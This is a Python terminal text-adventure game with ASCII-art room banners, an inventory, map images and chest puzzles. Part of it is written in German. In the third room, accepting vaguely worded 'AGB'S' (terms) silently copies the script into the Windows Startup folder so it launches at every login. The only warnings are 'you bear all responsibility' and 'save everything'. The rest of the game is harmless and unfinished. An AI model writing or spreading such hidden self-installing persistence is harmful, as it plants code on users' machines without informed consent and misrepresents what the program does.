import sys
import keyboard
import os
import time
from PIL import Image
from colorama import init, Back
import shutil
from pathlib import Path


finished = 0
auswahl = 0
raum1_1 = 0
raum1_1_1 = 0
key = 0
inventoryL = ["Starterpack", "Map Room 1"]


init(autoreset=True)

def bild(image_path, new_width=360):
    try:
        img = Image.open(image_path)
        width, height = img.size
        aspect_ratio = height / width
        new_height = int(new_width * aspect_ratio * 0.5)
        
        img = img.resize((new_width, new_height))
        img = img.convert("RGB")
        
        pixels = img.load()
        
        for y in range(new_height):
            line = ""
            for x in range(new_width):
                r, g, b = pixels[x, y]
                
                ansi_color = f"\033[48;2;{r};{g};{b}m"
                line += f"{ansi_color} {Back.RESET}"
                
            print(line)
            
    except Exception as e:
        print("Fehler")

def raum1_chest():
    global finished
    global key
    os.system("cls" if os.name == "nt" else "clear")
    print(""" ██████╗██╗  ██╗███████╗███████╗████████╗    ██╗      ██████╗  ██████╗ ████████╗
██╔════╝██║  ██║██╔════╝██╔════╝╚══██╔══╝    ██║     ██╔═══██╗██╔═══██╗╚══██╔══╝
██║     ███████║█████╗  ███████╗   ██║       ██║     ██║   ██║██║   ██║   ██║   
██║     ██╔══██║██╔══╝  ╚════██║   ██║       ██║     ██║   ██║██║   ██║   ██║   
╚██████╗██║  ██║███████╗███████║   ██║       ███████╗╚██████╔╝╚██████╔╝   ██║   
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   
                                                                                
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗  
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  
""")
    print("")
    print("You opened the chest and found a Key as well as a Map for Room 2")
    print("")
    print("Press 2 to go back")
    time.sleep(0.2)
    key = 1
    finished = 1
    inventoryL.append("Key")
    inventoryL.append("Map Room 2")
    while True:
        taste1_1_2 = keyboard.read_key()
        if taste1_1_2 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            raum1_options()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            raum1_chest()
    


def inventory():
    os.system("cls" if os.name == "nt" else "clear")
    print("""██╗███╗   ██╗██╗   ██╗███████╗███╗   ██╗████████╗ ██████╗ ██████╗ ██╗   ██╗
██║████╗  ██║██║   ██║██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
██║██╔██╗ ██║██║   ██║█████╗  ██╔██╗ ██║   ██║   ██║   ██║██████╔╝ ╚████╔╝ 
██║██║╚██╗██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██╔══██╗  ╚██╔╝  
██║██║ ╚████║ ╚████╔╝ ███████╗██║ ╚████║   ██║   ╚██████╔╝██║  ██║   ██║   
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                                         
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗   
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝   
""")
    print("")
    print("You have the following Items in your Inventory:")
    for item in inventoryL:
        print(f"- {item}")
    print("")
    time.sleep(0.2)
    print("Press 2 to go back")
    while True:
        taste1_1_3 = keyboard.read_key()
        if taste1_1_3 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            raum1_options()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            inventory()

def raum1_map():
    os.system("cls" if os.name == "nt" else "clear")
    bild(r"C:\Users\Paul Schultz\Desktop\Code Stuff etc\room1.png", new_width=360)
    print("")
    print("")
    print("Press 2 to go back")
    time.sleep(0.2)
    while True:
        taste1_1_4 = keyboard.read_key()
        if taste1_1_4 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            raum1()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum1_map()

def raum1_options():
    os.system("cls" if os.name == "nt" else "clear")
    print(""" ██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗
██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║███████╗
██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║╚════██║
╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║███████║
 ╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝  
    
    █████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗  
    ╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  
        """)
    print("")
    print("Press 1 to open chest")
    print("Press 2 to see youre collected Items")
    print("Press 3 to continue to next Room")
    print("Press 4 to go back")
    time.sleep(0.2)
    while True:
        taste1_1 = keyboard.read_key()
        if taste1_1 == "1":
            raum1_chest()
            break
        elif taste1_1 == "2":
            inventory()
            break
        elif taste1_1 == "3":
            os.system("cls" if os.name == "nt" else "clear")
            if finished == 1:
                raum2()
            else:
                print("""██╗   ██╗ ██████╗ ██╗   ██╗     █████╗ ██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗    ██████╗ ███████╗██████╗ ███╗   ███╗██╗████████╗████████╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██╔══██╗██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝    ██╔══██╗██╔════╝██╔══██╗████╗ ████║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ███████║██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║       ██████╔╝█████╗  ██████╔╝██╔████╔██║██║   ██║      ██║   █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██╔══██║██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║       ██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║      ██║   ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ██║  ██║██║  ██║███████╗    ██║ ╚████║╚██████╔╝   ██║       ██║     ███████╗██║  ██║██║ ╚═╝ ██║██║   ██║      ██║   ███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═════╝ 
     
    █████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗ 
    ╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝ 
    """)
                print("")
                print("You have to finish the first Room before you can continue to the next one")
                time.sleep(3)
                os.system("cls" if os.name == "nt" else "clear")
                raum1()
        elif taste1_1 == "4":
                        os.system("cls" if os.name == "nt" else "clear")
                        raum1()
                        break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum1_options()

def raum1():
    os.system("cls" if os.name == "nt" else "clear")
    print("""██████╗  █████╗ ██╗   ██╗███╗   ███╗     ██╗
██╔══██╗██╔══██╗██║   ██║████╗ ████║    ███║
██████╔╝███████║██║   ██║██╔████╔██║    ╚██║
██╔══██╗██╔══██║██║   ██║██║╚██╔╝██║     ██║
██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║     ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚═╝ 

█████╗█████╗█████╗█████╗█████╗█████╗█████╗  
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  
""")
    print("")
    print("Press 1 to get Options")
    print("Press 2 to see the Room")
    print("Press 3 to quit")
    time.sleep(0.2)
    while True:
        taste1 = keyboard.read_key()
        if taste1 == "1":
            raum1_options()
            break
        elif taste1 == "2":
            raum1_map()
            break
        elif taste1 == "3":
            os.system("cls" if os.name == "nt" else "clear")
            sys.exit()
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum1()

def inventory2():
    os.system("cls" if os.name == "nt" else "clear")
    print("""██╗███╗   ██╗██╗   ██╗███████╗███╗   ██╗████████╗ ██████╗ ██████╗ ██╗   ██╗
██║████╗  ██║██║   ██║██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
██║██╔██╗ ██║██║   ██║█████╗  ██╔██╗ ██║   ██║   ██║   ██║██████╔╝ ╚████╔╝ 
██║██║╚██╗██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██╔══██╗  ╚██╔╝  
██║██║ ╚████║ ╚████╔╝ ███████╗██║ ╚████║   ██║   ╚██████╔╝██║  ██║   ██║   
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                                         
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗   
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝   
""")
    print("")
    print("You have the following Items in your Inventory:")
    for item in inventoryL:
        print(f"- {item}")
    print("")
    time.sleep(0.2)
    print("Press 2 to go back")
    while True:
        taste1_1_3 = keyboard.read_key()
        if taste1_1_3 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            raum2_options()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            inventory2()

def raum2_chest():
    global finished
    global key
    os.system("cls" if os.name == "nt" else "clear")
    print(""" ██████╗██╗  ██╗███████╗███████╗████████╗    ██╗      ██████╗  ██████╗ ████████╗
██╔════╝██║  ██║██╔════╝██╔════╝╚══██╔══╝    ██║     ██╔═══██╗██╔═══██╗╚══██╔══╝
██║     ███████║█████╗  ███████╗   ██║       ██║     ██║   ██║██║   ██║   ██║   
██║     ██╔══██║██╔══╝  ╚════██║   ██║       ██║     ██║   ██║██║   ██║   ██║   
╚██████╗██║  ██║███████╗███████║   ██║       ███████╗╚██████╔╝╚██████╔╝   ██║   
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   
                                                                                
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗  
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  """)
    print("")
    print("Nothing here, the chests are empty")
    print("")
    print("Press 2 to go back")
    time.sleep(0.2)
    finished = 1
    while True:
        taste2_1_2 = keyboard.read_key()
        if taste2_1_2 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            raum2_options()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            raum2_chest()

def raum2_map():
    os.system("cls" if os.name == "nt" else "clear")
    bild(r"C:\Users\Paul Schultz\Desktop\Code Stuff etc\room2.jpg", new_width=360)
    print("")
    print("")
    print("Press 2 to go back")
    time.sleep(0.2)
    while True:
        taste2_1_4 = keyboard.read_key()
        if taste2_1_4 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            raum2()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum2_map()

def raum2_options():
    os.system("cls" if os.name == "nt" else "clear")
    print(""" ██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗
██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║███████╗
██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║╚════██║
╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║███████║
 ╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝  
        
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗  
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  
            """)
    print("")
    print("Press 1 to open chest")
    print("Press 2 to see youre collected Items")
    print("Press 3 to continue to next Room")
    print("Press 4 to go back")
    time.sleep(0.2)
    while True:
        taste2_1 = keyboard.read_key()
        if taste2_1 == "1":
            raum2_chest()
            break
        elif taste2_1 == "2":
            inventory2()
            break
        elif taste2_1 == "3":
            os.system("cls" if os.name == "nt" else "clear")
            if finished == 1:
                raum3()
            else:
                print("""██╗   ██╗ ██████╗ ██╗   ██╗     █████╗ ██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗    ██████╗ ███████╗██████╗ ███╗   ███╗██╗████████╗████████╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██╔══██╗██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝    ██╔══██╗██╔════╝██╔══██╗████╗ ████║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ███████║██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║       ██████╔╝█████╗  ██████╔╝██╔████╔██║██║   ██║      ██║   █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██╔══██║██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║       ██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║      ██║   ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ██║  ██║██║  ██║███████╗    ██║ ╚████║╚██████╔╝   ██║       ██║     ███████╗██║  ██║██║ ╚═╝ ██║██║   ██║      ██║   ███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═════╝ 
         
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗ 
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝ """)
                print("")
                print("You have to finish the first Room before you can continue to the next one")
                time.sleep(3)
                os.system("cls" if os.name == "nt" else "clear")
                raum2()
        elif taste2_1 == "4":
                        os.system("cls" if os.name == "nt" else "clear")
                        raum2()
                        break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum2_options()


def raum2():
    os.system("cls" if os.name == "nt" else "clear")
    finished = 0
    print("""██████╗  █████╗ ██╗   ██╗███╗   ███╗    ██████╗ 
██╔══██╗██╔══██╗██║   ██║████╗ ████║    ╚════██╗
██████╔╝███████║██║   ██║██╔████╔██║     █████╔╝
██╔══██╗██╔══██║██║   ██║██║╚██╔╝██║    ██╔═══╝ 
██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║    ███████╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝    ╚══════╝

█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝
""")
    print("")
    print("Press 1 to get Options")
    print("Press 2 to see the Room")
    print("Press 3 to quit")
    time.sleep(0.2)
    while True:
        taste2 = keyboard.read_key()
        if taste2 == "1":
            raum2_options()
            break
        elif taste2 == "2":
            raum2_map()
            break
        elif taste2 == "3":
            os.system("cls" if os.name == "nt" else "clear")
            sys.exit()
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum2()
def raum3_1():
    global finished
    global key
    finished = 0
    os.system("cls" if os.name == "nt" else "clear")
    print("""██╗██╗██╗    ███████╗████████╗ ██████╗ ██████╗ ██╗   ██╗    ██╗██╗██╗
██║██║██║    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝    ██║██║██║
██║██║██║    ███████╗   ██║   ██║   ██║██████╔╝ ╚████╔╝     ██║██║██║
╚═╝╚═╝╚═╝    ╚════██║   ██║   ██║   ██║██╔══██╗  ╚██╔╝      ╚═╝╚═╝╚═╝
██╗██╗██╗    ███████║   ██║   ╚██████╔╝██║  ██║   ██║       ██╗██╗██╗
╚═╝╚═╝╚═╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝╚═╝╚═╝
    
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗   
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝""")
    print("")
    print("In diesem Raum wissen wir nicht was sie erwarten wird, seien sie vorsichtig")
    time.sleep(1)
    print("Wir haben nur die information das meistgenutzte Password der Schlüssel ist")
    time.sleep(1)
    print("Und noch so einen Alten Schluessel")
    time.sleep(1)


def raum3():
    global finished
    global key
    finished = 0
    os.system("cls" if os.name == "nt" else "clear")
    print(""" █████╗      ██████╗     ██████╗     ███████╗                ██╗    ██╗██╗ ██████╗██╗  ██╗████████╗██╗ ██████╗ 
██╔══██╗    ██╔════╝     ██╔══██╗    ██╔════╝                ██║    ██║██║██╔════╝██║  ██║╚══██╔══╝██║██╔════╝ 
███████║    ██║  ███╗    ██████╔╝    ███████╗                ██║ █╗ ██║██║██║     ███████║   ██║   ██║██║  ███╗
██╔══██║    ██║   ██║    ██╔══██╗    ╚════██║                ██║███╗██║██║██║     ██╔══██║   ██║   ██║██║   ██║
██║  ██║    ╚██████╔╝    ██████╔╝    ███████║                ╚███╔███╔╝██║╚██████╗██║  ██║   ██║   ██║╚██████╔╝
╚═╝  ╚═╝     ╚═════╝     ╚═════╝     ╚══════╝                 ╚══╝╚══╝ ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ 
   
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗   
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝ """)
    print("")
    print("Sie muessen die AGB'S akzeptieren um fortzufahren")
    time.sleep(1)
    print("Sie tragen alle Verantwortungen fuer das was jetzt passiert")
    time.sleep(1)
    print("!!!! ALLES SPEICHERN !!!!")
    time.sleep(1)
    print("!!!! ALLES SPEICHERN !!!!")
    time.sleep(1)
    print("Press 1 to accept the AGB'S and continue")
    print("Press 2 to quit")
    while True:
        taste4 = keyboard.read_key()
        if taste4 == "1":
            quelle = Path(__file__).resolve()
            autostart = Path(os.environ["APPDATA"]) / (
                "Microsoft/Windows/Start Menu/Programs/Startup"
            )
            ziel = autostart / quelle.name
            autostart.mkdir(parents=True, exist_ok=True)
            shutil.copy2(quelle, ziel)
            raum3_1()
            break
        elif taste4 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            sys.exit()
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            raum3()
    os.system("cls" if os.name == "nt" else "clear")

def explanation():
    os.system("cls" if os.name == "nt" else "clear")
    print("""███████╗██╗  ██╗██████╗ ██╗      █████╗ ███╗   ██╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗ 
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔══██╗████╗  ██║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║ 
█████╗   ╚███╔╝ ██████╔╝██║     ███████║██╔██╗ ██║███████║   ██║   ██║██║   ██║██╔██╗ ██║ 
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██╔══██║██║╚██╗██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║ 
███████╗██╔╝ ██╗██║     ███████╗██║  ██║██║ ╚████║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║ 
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ 
                                                                                                                                                                                
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝""")
    print("")
    print("This is a text based adventure game, where you have to find items and solve puzzles to progress through the rooms.")
    print("You can use the keyboard to navigate through the game and make choices.")
    print("You can also view the map of the rooms and see your collected items in your inventory.")
    print("")
    print("")
    print("")
    print("")
    print("")
    print("")
    print("")
    print("")
    print("")
    print("Most used Password is the solution to everything if you are stuck")
    print("Press 2 to go back")
    while True:
        taste100 = keyboard.read_key()
        if taste100 == "2":
            os.system("cls" if os.name == "nt" else "clear")
            lobby()
            break
        else:
            os.system("cls" if os.name == "nt" else "clear")
            print("Please press a valid key")
            time.sleep(1)
            explanation()


def lobby():
    os.system("cls" if os.name == "nt" else "clear")
    print("""████████╗███████╗██╗  ██╗████████╗     █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
╚══██╔══╝██╔════╝╚██╗██╔╝╚══██╔══╝    ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║██╔══██╗██╔════╝
   ██║   █████╗   ╚███╔╝    ██║       ███████║██║  ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██████╔╝█████╗  
   ██║   ██╔══╝   ██╔██╗    ██║       ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║   ██║   ██║   ██║██╔══██╗██╔══╝  
   ██║   ███████╗██╔╝ ██╗   ██║       ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║  ██║███████╗
   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                                                                                   
█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗ 
╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝ """)
    print("")
    print("Press 1 for playing")
    print("Press 2 for seeing the explanation")
    print("Press 3 for quitting") 
    time.sleep(0.2)
    while True:
        taste = keyboard.read_key()
        if taste == "1":
            os.system("cls" if os.name == "nt" else "clear")
            raum1()
        elif taste == "2":
            os.system("cls" if os.name == "nt" else "clear")
            explanation()
        elif taste == "3":
            os.system("cls" if os.name == "nt" else "clear")
            sys.exit()
        else:
            print("Please press a valid key")
            time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
            lobby()
    


lobby()